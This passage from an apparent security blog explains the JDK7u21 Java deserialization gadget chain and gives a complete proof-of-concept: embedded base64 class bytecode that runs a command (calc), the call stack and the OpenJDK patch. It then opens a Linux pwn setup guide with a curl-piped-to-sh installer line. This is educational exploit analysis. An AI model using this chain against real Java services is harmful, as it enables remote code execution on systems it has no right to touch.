<p>而 <code>equalsImpl</code> 方法可以通过 <code>AnnotationInvocationHandler#invoke</code> 方法调用。也就是说如果我们使用 <code>AnnotationInvocationHandler#invoke</code> 代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发 <code>AnnotationInvocationHandler#equalsImpl</code> 方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code> 来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员 <code>private transient HashMap&lt;E,Object&gt; map;</code> 的键中，而对应的值设为一个 <code>Object</code> 类型的对象来占位（<del>真够懒的</del>）。因此在 <code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code> 存储的元素逐个加到 <code>HashMap</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HashMap</code> 中会计算哈希值找到对应的桶然后逐个比较去重，最后放到 <code>HashMap</code> 中。这里涉及到了 <code>equals</code> 方法的调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">       ...</span><br><span class="line">       </span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">           Object k;</span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">               <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">               e.value = value;</span><br><span class="line">               e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       modCount++;</span><br><span class="line">       addEntry(hash, key, value, i);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们在 <code>HashSet</code> 中放一个 <code>TemplatesImpl</code> 对象再放一个 <code>AnnotationInvocationHandler</code> 代理的对象，并且恰巧这两个对象的哈希值相等且 <code>AnnotationInvocationHandler</code> 代理的对象是后加入的，那么调用 <code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code> 方法，因此它将继承自 <code>java.lang.Object</code> 类中的默认实现。在这种情况下，调用 <code>hashCode()</code> 方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code> 对象的哈希值相等。 </p>
<p><code>AnnotationInvocationHandler</code> 代理的对象的 <code>hashCode</code> 方法实际上调用的是 <code>AnnotationInvocationHandler#invoke</code> 进而会调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code> 中的每个 <code>key</code> 和 <code>value</code>，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong> <code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到 <code>f5a5a608</code> 这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出 <code>\0</code> 这一字符串。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADMANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHADAMADEAMgEABGNhbGMMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAeY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADgAJABEADAAPAA0AEAAWABIADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span>  clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(set);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:136, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:339, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:376, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">equals:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">put:475, HashMap (java.util)</span><br><span class="line">readObject:309, HashSet (java.util)</span><br><span class="line">...</span><br><span class="line">main:48, JDK7u21 (com.example)</span><br></pre></td></tr></table></figure></div>
<p> <a class="link"   href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>linux user pwn 基础知识</title>
    <url>/2024/11/07/linux-user-pwn-basic-knowlege/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><ul>
<li><a class="link"   href="http://old-releases.ubuntu.com/releases/" >镜像下载网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>为了避免环境问题建议 22.04 ，20.04，18.04，16.04 等常见版本 ubuntu 虚拟机环境各准备一份。注意定期更新快照以防意外。</li>
<li>虚拟机建议硬盘 256 G 以上，内存也尽量大一些。硬盘大小只是上界，256 G 不是真就占了 256 G，而后期如果硬盘空间不足会很麻烦。</li>
<li>更换 <a class="link"   href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" >ubuntu 镜像源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，建议先在 <code>系统设置 → Software &amp; Updates → Download from → 选择国内服务器例如阿里云</code>（貌似不这样后续换源会出错），然后再 <code>sudo gedit /etc/apt/sources.list</code> 将镜像源中<strong>不高于</strong>当前系统版本的镜像复制进去（高于当前系统版本容易把 <code>apt</code> 搞坏）。</li>
<li>Ubuntu 换源 error：The following signatures couldn’t be verified because the public key is not available 解决方法：<code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5523BAEEB01FA116</code> 其中的<code>5523BAEEB01FA116</code> 是根据错误提示写的。</li>
</ul>
<h2 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h2><h3 id="net-tools"><a href="#net-tools" class="headerlink" title="net-tools"></a>net-tools</h3><p><code>ifconfig</code> 查看网络配置需要安装 <code>net-tools</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install net-tools</span><br></pre></td></tr></table></figure></div>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install vim</span><br></pre></td></tr></table></figure></div>
<h3 id="gedit"><a href="#gedit" class="headerlink" title="gedit"></a>gedit</h3><p>不习惯 vim 的可以使用 gedit 文本编辑器。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gedit</span><br></pre></td></tr></table></figure></div>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure></div>
<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc</span><br><span class="line"><span class="built_in">sudo</span> apt install gcc-multilib</span><br></pre></td></tr></table></figure></div>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>ipython 提供了很好的 python 交互命令行，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br><span class="line"><span class="built_in">sudo</span> apt install python3</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython3</span><br></pre></td></tr></table></figure></div>
<p>另外有的版本 ubuntu 的不好安装 pip2 可以使用 <code>get-pip.py</code> 脚本安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> apt  install curl</span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py</span><br></pre></td></tr></table></figure></div>
<p>ubuntu 22.04 的 ipython（python2）必须使用 pip2 安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 install ipython</span><br></pre></td></tr></table></figure></div>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure></div>
<p>默认情况下，Docker 命令需要使用 sudo 权限才能运行，这是因为 Docker 守护进程以 root 用户身份运行。然而，你可以通过以下步骤将当前用户添加到 Docker 用户组，从而允许在不使用 sudo 的情况下运行 Docker 命令：</p>
<ul>
<li><p>确保当前用户属于 <code>docker</code> 组：运行以下命令检查当前用户是否已添加到 docker 组：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure></div>
<p>在输出的组列表中查找 <code>docker</code>。如果没有找到 <code>docker</code> 组，请继续下一步。</p>
</li>
<li><p>将当前用户添加到 <code>docker</code> 组：运行以下命令将当前用户添加到 <code>docker</code> 组中（将 <code>&lt;username&gt;</code> 替换为你的用户名）：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker &lt;username&gt;</span><br></pre></td></tr></table></figure></div></li>
<li><p>更新用户组更改：运行以下命令使用户组更改生效：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">newgrp docker</span><br></pre></td></tr></table></figure></div></li>
<li><p>重新登录或重启系统：要使用户组更改永久生效，你需要注销当前会话并重新登录，或者重启系统。</p>
</li>
</ul>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p>安装 zsh</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 <a class="link"   href="https://ohmyz.sh/#install" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>设置 zsh 为默认 shell（重启虚拟机后生效）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 oh-my-zsh 插件 <a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md" >zsh-autosuggestions  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div>
<p>编辑 <code>~/.zshrc</code> 添加插件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">    <span class="comment"># other plugins...</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    extract</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>更新：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure></div>
